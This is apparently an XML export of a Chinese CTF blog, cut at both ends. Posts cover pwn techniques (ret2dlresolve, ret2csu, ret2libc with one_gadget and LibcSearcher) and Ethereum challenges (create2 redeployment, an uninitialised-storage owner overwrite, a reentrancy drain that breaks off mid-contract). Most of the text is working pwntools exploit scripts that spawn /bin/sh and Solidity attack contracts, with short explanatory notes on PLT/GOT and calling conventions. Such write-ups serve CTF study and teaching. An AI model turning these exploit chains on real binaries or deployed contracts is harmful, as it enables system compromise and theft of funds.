'./main'p = process(name)elf= ELF(name)rel_plt_addr = elf.get_section_by_name('.rel.plt').header.sh_addr #0x8048330dynsym_addr = elf.get_section_by_name('.dynsym').header.sh_addr #0x80481d8dynstr_addr = elf.get_section_by_name('.dynstr').header.sh_addr #0x8048278resolve_plt = 0x08048380leave_ret_addr = 0x0804851Dstart = 0x804aa00fake_rel_plt_addr = startfake_dynsym_addr = fake_rel_plt_addr + 0x8fake_dynstr_addr = fake_dynsym_addr + 0x10bin_sh_addr = fake_dynstr_addr + 0x8#n index_argn = fake_rel_plt_addr - rel_plt_addrr_info = (((fake_dynsym_addr - dynsym_addr)/0x10) &lt;&lt; 8) + 0x7str_offset = fake_dynstr_addr - dynstr_addrfake_rel_plt = p32(elf.got['read']) + p32(r_info)fake_dynsym = p32(str_offset) + p32(0) + p32(0) + p32(0x12000000)fake_dynstr = "system"+'\x00'+'\x00'fake_dynstr += "/bin/sh"+'\x00'pay1 = 'a'*108 + p32(start - 20) + p32(elf.plt['read']) + p32(leave_ret_addr) + p32(0) + p32(start - 20) + p32(0x100)p.recvuntil('Welcome to XDCTF2015~!\n')p.sendline(pay1)pay2 = p32(0x0) + p32(resolve_plt) + p32(n) + 'aaaa' + p32(bin_sh_addr) + fake_rel_plt + fake_dynsym + fake_dynstrp.sendline(pay2)success(".rel_plt: " + hex(rel_plt_addr))success(".dynsym: " + hex(dynsym_addr))success(".dynstr: " + hex(dynstr_addr))success("fake_rel_plt_addr: " + hex(fake_rel_plt_addr))success("fake_dynsym_addr: " + hex(fake_dynsym_addr))success("fake_dynstr_addr: " + hex(fake_dynstr_addr))success("n: " + hex(n))success("r_info: " + hex(r_info))success("offset: " + hex(str_offset))success("system_addr: " + hex(fake_dynstr_addr))success("bss_addr: " + hex(elf.bss()))p.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>elf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2csu]]></title>
    <url>%2F2020%2Fret2csu%2F</url>
    <content type="text"><![CDATA[ctf-wiki 中 ret2csu ，对于 64 位程序，详细参考 ctf-wiki 我的测试环境为 ubuntu18.04 ，因为这个环境卡了好久，多了一条指令，最后总是跳不过去 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140from pwn import *local=1pc=&apos;./level5&apos;aslr=Truecontext.log_level=True#context.terminal = [&quot;deepin-terminal&quot;,&quot;-x&quot;,&quot;sh&quot;,&quot;-c&quot;]libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)level5 = ELF(&apos;./level5&apos;)if local==1: #p = process(pc,aslr=aslr,env=&#123;&apos;LD_PRELOAD&apos;: &apos;./libc.so.6&apos;&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,&apos;c&apos;)else: remote_addr=[&apos;111.198.29.45&apos;, 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =&quot;&quot;): gdb.attach(p , b) raw_input()def lg(s, addr): log.info(&apos;\033[1;31;40m %s --&gt; 0x%x \033[0m&apos; % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,&apos;\x00&apos;)) else: return u64(rl().strip(&apos;\n&apos;).ljust(8,&apos;\x00&apos;))csu_front_addr = 0x400600csu_end_addr = 0x40061adef csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = &apos;a&apos;*0x80 payload += &apos;b&apos;*8 payload += p64(csu_end_addr) payload += p64(rbx) payload += p64(rbp) payload += p64(r12) payload += p64(r13) payload += p64(r14) payload += p64(r15) payload += p64(csu_front_addr) payload += &apos;c&apos;*0x38 payload += p64(last) sl(payload) sleep(1)if __name__ == &apos;__main__&apos;: write_plt = level5.plt[&apos;write&apos;] write_got = level5.got[&apos;write&apos;] start_addr = level5.symbols[&apos;_start&apos;] bss_addr = level5.bss() read_got = level5.got[&apos;read&apos;] lg(&apos;write_plt&apos;, write_plt) lg(&apos;write_got&apos;, write_got) lg(&apos;start_addr&apos;, start_addr) lg(&apos;bss_addr&apos;, bss_addr) ru(&apos;Hello, World\n&apos;) # write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, start_addr) write_addr = u64(rv(8)) lg(&apos;write_addr&apos;, write_addr) # 0x250 libc_base_addr = write_addr - libc.symbols[&apos;write&apos;] lg(&apos;libc_base_addr&apos;, libc_base_addr) system_addr = libc_base_addr + libc.symbols[&apos;system&apos;] lg(&apos;system_addr&apos;, system_addr) binsh_addr = libc_base_addr + libc.search(&quot;/bin/sh&quot;).next() lg(&apos;binsh_addr&apos;, binsh_addr) ru(&apos;Hello, World\n&apos;) # read(0,bss_base,16) # read system and /bin/sh\x00 csu(0, 1, read_got, 16, bss_addr, 0, start_addr) sn(p64(system_addr)+&apos;/bin/sh\x00&apos;) # gdb.attach(p) # pause() ru(&apos;Hello, World\n&apos;) # csu(0, 1, bss_addr, 0, 0, bss_addr+8, start_addr) # system(bss_base+8) payload = &apos;a&apos;*0x80 payload += &apos;b&apos;*8 # 就是这个地方多了一条movaps命令，所以跳不过去，所以需要pop rip一下，如果是ubuntu16.04应该是正常的 payload += p64(0x400624) payload += p64(csu_end_addr) payload += p64(0) payload += p64(1) payload += p64(bss_addr) payload += p64(0) payload += p64(0) payload += p64(bss_addr+8) payload += p64(csu_front_addr) payload += &apos;c&apos;*0x38 payload += p64(start_addr) sl(payload) pi()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ret2csu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[32&64]]></title>
    <url>%2F2020%2F32-64%2F</url>
    <content type="text"><![CDATA[32 位和 64 位程序的一些简单区别 随时更新，想到哪写到哪 参数顺序 32位 函数参数在函数返回地址的上方 参数从右向左依次放入栈中 64位 当参数小于 7 个时，参数从左到右放入寄存器： rdi、rsi、rdx、rcx、r8、r9 当参数为 7 个以上时，前 6 个与前面一样，但后面的依次从右向左放入栈中，即和32位汇编一样]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ret2libc3]]></title>
    <url>%2F2020%2Fret2libc3%2F</url>
    <content type="text"><![CDATA[ctf-wiki 中 ret2libc3 没有 system 和 /bin/sh ，泄漏 libc Analyse 泄漏 _start 地址 获取 libc 版本 获取 system 与 /bin/sh 地址 再次执行源程序 触发栈溢出执行 system(&#39;/bin/sh&#39;) Exp 1 自己写的 exp ，根据泄漏的地址先找到 libc 到返回地址的偏移可使用 cyclic 快速判断12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273from pwn import *local=1pc='./ret2libc3'aslr=Truecontext.log_level=True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc=ELF('./libc6_2.27-3ubuntu1.2_i386.so')ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr=['111.198.29.45', 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(io , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] lg('start_addr',start_addr) payload = 'a' * 112 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) payload += '\x00' sl(payload) ru('Can you find it !?') libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr',libc_start_main_addr) distance = libc.symbols['system'] - libc.symbols['__libc_start_main'] lg('distance', distance) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] system_addr = libc_base_addr + libc.symbols['system'] binsh_addr = libc_base_addr + libc.search("/bin/sh").next() lg('system_addr', system_addr) lg('binsh_addr', binsh_addr) payload = 'a' * 112 payload += p32(system_addr) payload += p32(0xdeadbeef) payload += p32(binsh_addr) sl(payload) pi() Exp 2 先泄漏 libc ，然后使用 one_gadget123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172from pwn import *local=1pc='./ret2libc3'aslr=Truecontext.log_level=True#context.terminal = ["deepin-terminal","-x","sh","-c"]libc=ELF('./libc6_2.27-3ubuntu1.2_i386.so')ret2libc3 = ELF('./ret2libc3')if local==1: #p = process(pc,aslr=aslr,env=&#123;'LD_PRELOAD': './libc.so.6'&#125;) p = process(pc,aslr=aslr) #gdb.attach(p,'c')else: remote_addr=['111.198.29.45', 39802] p=remote(remote_addr[0],remote_addr[1])ru = lambda x : p.recvuntil(x)rud = lambda x : p.recvuntil(x ,drop=True)sn = lambda x : p.send(x)rl = lambda : p.recvline()sl = lambda x : p.sendline(x)rv = lambda x : p.recv(x)sa = lambda a,b : p.sendafter(a,b)sla = lambda a,b : p.sendlineafter(a,b)pi = lambda : p.interactive()def dbg(b =""): gdb.attach(io , b) raw_input()def lg(s, addr): log.info('\033[1;31;40m %s --&gt; 0x%x \033[0m' % (s,addr))def raddr(a=6): if(a==6): return u64(rv(a).ljust(8,'\x00')) else: return u64(rl().strip('\n').ljust(8,'\x00'))if __name__ == '__main__': puts_plt = ret2libc3.plt['puts'] libc_start_main_got = ret2libc3.got['__libc_start_main'] start_addr = ret2libc3.symbols['_start'] lg('start_addr',start_addr) payload = 'a' * 112 payload += p32(puts_plt) payload += p32(start_addr) payload += p32(libc_start_main_got) sl(payload) ru('Can you find it !?') libc_start_main_addr = u32(p.recv()[0:4]) lg('libc_start_main_addr',libc_start_main_addr) libc_base_addr = libc_start_main_addr - libc.symbols['__libc_start_main'] one_gadget = libc_base_addr + 0x3d130 payload = 'a' * 112 payload += p32(one_gadget) sl(payload) pi()"""0x3d130 execve("/bin/sh", esp+0x40, environ)constraints: esi is the GOT address of libc [esp+0x40] == NULL""" Exp 3 网上找的另一个版本使用 LibcSearcher 泄漏 libc12345678910111213141516171819202122232425262728##coding=utf-8from pwn import *from LibcSearcher import LibcSearchercontext.binary='ret2libc3'sh = process('./ret2libc3')ret2libc3 = ELF('./ret2libc3')puts_plt = ret2libc3.plt['puts']libc_start_main_got = ret2libc3.got['__libc_start_main']main = ret2libc3.symbols['_start']print("leak main_got addr and return main")payload = flat(['A'*112,puts_plt,main,libc_start_main_got])sh.sendlineafter('Can you find it !?',payload)libc_start_main_addr = u32(sh.recv()[0:4])print(hex(libc_start_main_addr))libc = LibcSearcher('__libc_start_main',libc_start_main_addr)libcbase = libc_start_main_addr-libc.dump('__libc_start_main')system_addr = libcbase+libc.dump('system')binsh_addr = libcbase +libc.dump('str_bin_sh')print("now get shell")payload = flat(['A'*112,system_addr,'A'*4,binsh_addr])sh.send(payload)sh.interactive()]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>ret2libc3</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[plt&got]]></title>
    <url>%2F2020%2Fplt-got%2F</url>
    <content type="text"><![CDATA[学习一些 pwn 的知识，简单记录帮助自己理解 Preview .got GOT(Global Offset Table) 全局偏移表。这是链接器为外部符号填充的实际偏移表。 .plt PLT(Procedure Linkage Table) 程序链接表。它有两个功能，要么在 .got.plt 节中拿到地址并跳转，要么当 .got.plt 没有所需地址时，触发链接器去找到所需地址。 .got.plt 这个是 GOT 专门为 PLT 专门准备的节。.got.plt 中的值是 GOT 的一部分，它包含上述 PLT 表所需的地址（已经找到的和需要去触发的） .plt.got Unknown Analyse 下面所有的图片来自于 https://blog.csdn.net/weixin_44681716/article/details/89877497 程序编译时会采用两种表进行辅助，一个为 PLT 表，一个为 GOT 表，这两个表是相对应的。PLT 表中的每一项的数据内容都是对应的 GOT 表中一项的地址，这个是固定不变的，PLT 表中的数据不是函数的真实地址，而是 GOT 表项的地址。 下图是第一次调用函数的流程 第一步，由函数调用跳入到 PLT 表中 第二步，PLT 表跳到 GOT 表中 第三步，GOT 表回跳到 PLT 表中，这时候进行压栈，把代表函数的 ID 压栈 第四步，跳转到公共的 PLT 表项中 第五步，进入到 GOT 表 第六步，_dl_runtime_resolve 对动态函数进行地址解析和重定位 第七步，把动态函数真实的地址写入到 GOT 表项中 第八步，执行函数并返回 下图是第二次调用函数的流程 第一步，由函数调用调入到 PLT 表中 第二步，跳入到 GOT 表，由于这时候该表项已经是动态函数的真实地址，所以可以直接执行然后返回 Referencehttps://blog.csdn.net/weixin_44681716/article/details/89877497https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>plt</tag>
        <tag>got</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[第五空间 CreativityPlus]]></title>
    <url>%2F2020%2Fcreativityplus%2F</url>
    <content type="text"><![CDATA[前言 第五空间 creativityplus 题目 题目有个非预期，直接部署一个字节 stop 指令也可以，0x600a600c60003960016000f3+00 文章介绍预期解 Analyse &amp; Solution 题目很简单，改编自 Creativity 题目，简称 CreativityPlus 升级版 考点 create2 与 bytecode 题目逻辑如下： 部署一个合约，大小不超过 4 字节 调用 check ，参数是我们部署的合约地址 调用 execute，使得返回值为 true，我们即可成为 owner 但是我们没法在 4 个字节内 emit SendFlag create2 骚操作，使用如下代码可将不同 bytecode 部署到同一个地址上，deployedAddr 即为部署的合约地址 123456789101112131415161718192021222324252627pragma solidity ^0.5.10;contract Deployer &#123; bytes public deployBytecode; address public deployedAddr; function deploy(bytes memory code) public &#123; deployBytecode = code; address a; // Compile Dumper to get this bytecode bytes memory dumperBytecode = hex&apos;6080604052348015600f57600080fd5b50600033905060608173ffffffffffffffffffffffffffffffffffffffff166331d191666040518163ffffffff1660e01b815260040160006040518083038186803b158015605c57600080fd5b505afa158015606f573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052506020811015609857600080fd5b81019080805164010000000081111560af57600080fd5b8281019050602081018481111560c457600080fd5b815185600182028301116401000000008211171560e057600080fd5b50509291905050509050805160208201f3fe&apos;; assembly &#123; a := create2(callvalue, add(0x20, dumperBytecode), mload(dumperBytecode), 0x8866) &#125; deployedAddr = a; &#125;&#125;contract Dumper &#123; constructor() public &#123; Deployer dp = Deployer(msg.sender); bytes memory bytecode = dp.deployBytecode(); assembly &#123; return (add(bytecode, 0x20), mload(bytecode)) &#125; &#125;&#125; 所以题目的逻辑如下: 用 create2 的骚操作,部署一个合约 0x33ff ,即 selfdestruct(msg.sender) 调用 check() ,让 target 为我们部署的合约地址 给我们部署的合约发一笔空交易,让它自毁 再次使用 create2 骚操作,在同一个地址部署合约,合约内容大小不超过 10 字节，返回 1 返回值由 return(p, s) 操作码处理，但是在返回值之前，必须先存储在内存中，使用 mstore(p, v) 将 1 存储在内存中 首先，使用 mstore(p, v) 将 1 存储在内存中，其中 p 是在内存中的存储位置， v 是十六进制值，1 的十六进制是 0x01 1230x6001 ;PUSH1 0x01 v0x6080 ;PUSH1 0x80 p0x52 ;MSTORE 然后，使用 return(p, s) 返回 0x01 ，其中 p 是值 0x2a 存储的位置，s 是值 0x2a 存储所占的大小 0x20 ，占 32 字节 1230x6020 ;PUSH1 0x20 s0x6080 ;PUSH1 0x80 p0xf3 ;RETURN 所以我们只需使用 Deployer.deploy 部署 0x600160805260206080f3 即可，正好 10 opcodes 调用 execute 我们即可成为 owner]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Create2</tag>
        <tag>Solidity</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[以太坊蜜罐合约收集列表]]></title>
    <url>%2F2020%2Fhoneypot-list%2F</url>
    <content type="text"><![CDATA[前言 公链上的蜜罐合约 不断更新列表]]></content>
      <categories>
        <category>Ethereum</category>
      </categories>
      <tags>
        <tag>Ethereum</tag>
        <tag>Etherscan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Real World CTF Finals 2019 - Montagy]]></title>
    <url>%2F2020%2FMontagy%2F</url>
    <content type="text"><![CDATA[前言 rw2019 montagy 区块链题目 复现了，但是没有记录过程，这里只记录心得 复现的合约地址：0xd95C819d1DFBD085dFf0b3351230958Cb6075957@ropsten 详细 WP 见 https://x9453.github.io/2020/01/26/Real-World-CTF-Finals-2019-Montagy/ 合约确定后会有自己的 bytecode ，对 bytecode 进行 padding 不会影响其部署的结果 对 bytecode 进行 padding 要注意对齐问题，用 0 补齐]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>rw2019</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RCTF2020 roiscoin]]></title>
    <url>%2F2020%2Frctf2020-roiscoin%2F</url>
    <content type="text"><![CDATA[前言 RCTF2020 区块链 roiscoin 题目 以太坊 Ropsten 测试链 Source1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt;= address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; codex[idx] = tmp; &#125;&#125; Analyse 题目直接给了源码 题目有非预期：beOwner 在合约账户余额为 0 的情况下可以直接成为 owner ，这个没有控制好条件，同时 settle 那里应该也有非预期，应该只让猜 3 次，结果也没有控制好条件，本文不介绍非预期的做法 抛除非预期，这里介绍下题目正常的逻辑，考点有三个: 预测随机数: 这里的随机数是未来的随机数,可以说是预测未来的随机数,看似不可能,关键在于 guess 的范围是 2 ,也就是只有 0 和 1 ,所以可以爆破 未初始化的结构体 storage 覆盖问题: settle 中的 failedlog 未初始化会造成 storage 变量覆盖,会覆盖 codex 数组长度 数组任意写: 当数组长度被修改后,可以覆盖 owner ,当然这对数组长度有一定的要求,根据情况选择合适的数据,这里是用 msg.sender 覆盖数组长度的高 20 字节 exp 部署 hack 合约,这里需要注意: 数组在 storage5 位置, keccak256(bytes32(5)) = 0x036b6384b5eca791c62761152d0c79bb0604c104a5fb6f4eb0703f3154bb3db0 当我们修改 codex[y],(y=2^256-x+6) 时就能修改 slot 6 ，从而修改 owner , 其中 x = keccak256(bytes32(5)) 计算出 y = 114245411204874937970903528273105092893277201882823832116766311725579567940182 , 即 y = 0xfc949c7b4a13586e39d89eead2f38644f9fb3efb5a0490b14f8fc0ceab44c256 所以数组的长度 codex.length 要 &gt; y , 由于 msg.sender 覆盖数组长度的高 20 字节,所以其实是变相要求 address(msg.sender) &gt; y , 我们可以生成以 0xfd 或 0xfe 或 0xff 开头的地址即可简单满足这一点 解题步骤 调用 hack1 调用 hack2 一次,这一次需要满足 result = 1 ,否则继续调用 hack2 ,直至这一次成功 调用 hack3 两次,这两次需要满足 result = 0 ,否则继续调用 hack3 ,直至两次为止 调用 hack4 修改 owner ,这里有个坑点,题目给的合约不是真正的合约,因为调用 hack4 总是不能成功修改 owner , 逆向合约,可以看出 revise 函数有问题,额外要求 msg.sender 最低位字节是 0x61 ,所以对 msg.sender 总共有两点要求: 大于 y 并且最低字节是 0x61 调用 hack5 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143pragma solidity ^0.4.23;contract FakeOwnerGame &#123; event SendFlag(address _addr); uint randomNumber = 0; uint time = now; mapping (address =&gt; uint) public BalanceOf; mapping (address =&gt; uint) public WinCount; mapping (address =&gt; uint) public FailCount; bytes32[] public codex; address private owner; uint256 settlementBlockNumber; address guesser; uint8 guess; struct FailedLog &#123; uint failtag; uint failtime; uint success_count; address origin; uint fail_count; bytes12 hash; address msgsender; &#125; mapping(address =&gt; FailedLog[]) FailedLogs; constructor() &#123; owner = msg.sender; &#125; modifier onlyOwner() &#123; require(msg.sender == owner); _; &#125; function payforflag() onlyOwner &#123; require(BalanceOf[msg.sender] &gt;= 2000); emit SendFlag(msg.sender); selfdestruct(msg.sender); &#125; function lockInGuess(uint8 n) public payable &#123; require(guesser == 0); require(msg.value == 1 ether); guesser = msg.sender; guess = n; settlementBlockNumber = block.number + 1; &#125; function settle() public &#123; require(msg.sender == guesser); require(block.number &gt; settlementBlockNumber); uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (guess == answer) &#123; WinCount[msg.sender] += 1; BalanceOf[msg.sender] += 1000; &#125; else &#123; FailCount[msg.sender] += 1; &#125; if (WinCount[msg.sender] == 2) &#123; if (WinCount[msg.sender] + FailCount[msg.sender] &lt;= 2) &#123; guesser = 0; WinCount[msg.sender] = 0; FailCount[msg.sender] = 0; msg.sender.transfer(address(this).balance); &#125; else &#123; FailedLog failedlog; failedlog.failtag = 1; failedlog.failtime = now; failedlog.success_count = WinCount[msg.sender]; failedlog.origin = tx.origin; failedlog.fail_count = FailCount[msg.sender]; failedlog.hash = bytes12(sha3(WinCount[msg.sender] + FailCount[msg.sender])); failedlog.msgsender = msg.sender; FailedLogs[msg.sender].push(failedlog); &#125; &#125; &#125; function beOwner() payable &#123; require(address(this).balance &gt; 0); if(msg.value &gt;= address(this).balance)&#123; owner = msg.sender; &#125; &#125; function revise(uint idx, bytes32 tmp) &#123; if(uint(msg.sender) &amp; 0x61 == 0x61 &amp;&amp; tx.origin != msg.sender) &#123; codex[idx] = tmp; &#125; &#125; function read_slot(uint k) public view returns (bytes32 res) &#123; assembly &#123; res := sload(k) &#125; &#125; function cal_addr(uint p) public pure returns(bytes32 res) &#123; res = keccak256(abi.encodePacked(p)); &#125;&#125;contract hack &#123; uint public result; address instance_address = 0x7be4ae576495b00d23082575c17a354dd1d9e429 ; FakeOwnerGame target = FakeOwnerGame(instance_address); constructor() payable&#123;&#125; // 随机猜一个数0或1 function hack1() &#123; target.lockInGuess.value(1 ether)(0); &#125; // 这里先让result=1,即先猜失败 function hack2() &#123; result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (result == 1) &#123; target.settle(); &#125; &#125; // 这里让result=0,即猜测成功,连续调用两次 function hack3() &#123; result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 2; if (result == 0) &#123; target.settle(); &#125; &#125; // 修改owner function hack4() &#123; target.revise(114245411204874937970903528273105092893277201882823832116766311725579567940182,bytes32(address(this))); &#125; function hack5() &#123; target.payforflag(); &#125;&#125; 对于该题目生成满足 msg.sender 的合约地址可通过下面脚本生成,直接调用 generate_eoa2 即可 1234567891011121314151617181920212223242526272829303132333435from ethereum import utilsimport os, sys# generate EOA with appendix 1b1bdef generate_eoa1(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not addr.lower().endswith("1b1b"): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))# generate EOA with the ability to deploy contract with appendix 1b1bdef generate_eoa2(): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) while not (utils.decode_addr(utils.mk_contract_address(addr, 0)).endswith("61") and utils.decode_addr(utils.mk_contract_address(addr, 0)).startswith("fd")): priv = utils.sha3(os.urandom(4096)) addr = utils.checksum_encode(utils.privtoaddr(priv)) print('Address: &#123;&#125;\nPrivate Key: &#123;&#125;'.format(addr, priv.hex()))if __name__ == "__main__": if sys.argv[1] == "1": generate_eoa1() elif sys.argv[1] == "2": generate_eoa2() else: print("Please enter valid argument")]]></content>
      <categories>
        <category>Solidity</category>
      </categories>
      <tags>
        <tag>Blockchain</tag>
        <tag>rctf 2020</tag>
        <tag>roiscoin</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一道很简单的区块链题目]]></title>
    <url>%2F2020%2Feasy-blockchains%2F</url>
    <content type="text"><![CDATA[前言 不经意间看到的一个题目，就随便做了一下 大佬勿喷 合约地址：0x496371aF69612e7C85F8a558f9f19E0c15E9d4B0 @ ropsten, payforflag(string memory b64email) Analyse 没有给源码，自己逆向，得到下面的逻辑 12345678910111213141516171819202122232425262728293031323334353637383940pragma solidity ^0.4.23;contract test &#123; mapping(address=&gt;uint) public balance; address public owner; uint s2; uint s3; uint s4; function profit(uint amount) public &#123; require(balance[msg.sender] == 0); require(s2 != 0); if(amount % s2 == s3)&#123; require(s3 != 0); if(amount % s3 == s4)&#123; balance[msg.sender] += 3; &#125; &#125; &#125; function withdraw(uint amount) public &#123; require(amount == 2); require(balance[msg.sender] == 3); msg.sender.call.value(amount * 100000000000000)(); balance[msg.sender] -= amount; &#125; function payforflag(string memory b64email) public &#123; require(balance[msg.sender]&gt;=10000000000); &#125; function func_0531(uint t1, uint t2, uint t3) public &#123; require(msg.sender == owner); s2 = t1; s3 = t2; s4 = t3; &#125; &#125; 很简单，先调用 profit ，使得 balance[msg.sender] = 3 ，这里 s2、s3、s4是owner设置的，我们可以直接 web3.eth.getStorageAt 查看即可，发现 s2=65537、s3=64834、s4=41958，然后就是中国剩余定理求解问题，可用下面脚本，求得 amount=227609298 1234567891011121314151617181920212223#!/usr/bin/env python# -*- coding:utf-8 -*-from functools import reducedef egcd(a, b): """扩展欧几里得""" if 0 == b: return 1, 0, a x, y, q = egcd(b, a % b) x, y = y, (x - a // b * y) return x, y, qdef chinese_remainder(pairs): """中国剩余定理""" mod_list, remainder_list = [p[0] for p in pairs], [p[1] for p in pairs] mod_product = reduce(lambda x, y: x * y, mod_list) mi_list = [mod_product//x for x in mod_list] mi_inverse = [egcd(mi_list[i], mod_list[i])[0] for i in range(len(mi_list))] x = 0 for i in range(len(remainder_list)): x += mi_list[i] * mi_inverse[i] * remainder_list[i] x %= mod_product return xif __name__=='__main__': print(chinese_remainder([(65537, 64834), (64834, 41958)])) 然后调用 withdraw 两次，重入攻击，便可满足 balance[msg.sender]&gt;=10000000000 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667pragma solidity ^0.4.23;contract test &#123; mapping(address=&gt;uint) public balance; address public owner; uint s2; uint s3; uint s4; function profit(uint amount) public &#123; require(balance[msg.sender] == 0); require(s2 != 0); if(amount % s2 == s3)&#123; require(s3 != 0); if(amount % s3 == s4)&#123; balance[msg.sender] += 3; &#125; &#125; &#125; function withdraw(uint amount) public &#123; require(amount == 2); require(balance[msg.sender] == 3); msg.sender.call.value(amount * 100000000000000)(); balance[msg.sender] -= amount; &#125; function payforflag(string memory b64email) public &#123; require(balance[msg.sender]&gt;=10000000000); &#125; function func_0531(uint t1, uint t2, uint t3) public &#123; require(msg.sender == owner); s2 = t1; s3 = t2; s4 = t3; &#125; &#125;contract hack &#123; address instance_address = 0x496371aF69612e7C85F8a558f9f19E0c15E9d4B0 ; test target = test(instance_address); uint public have_withdraw = 0; constructor() 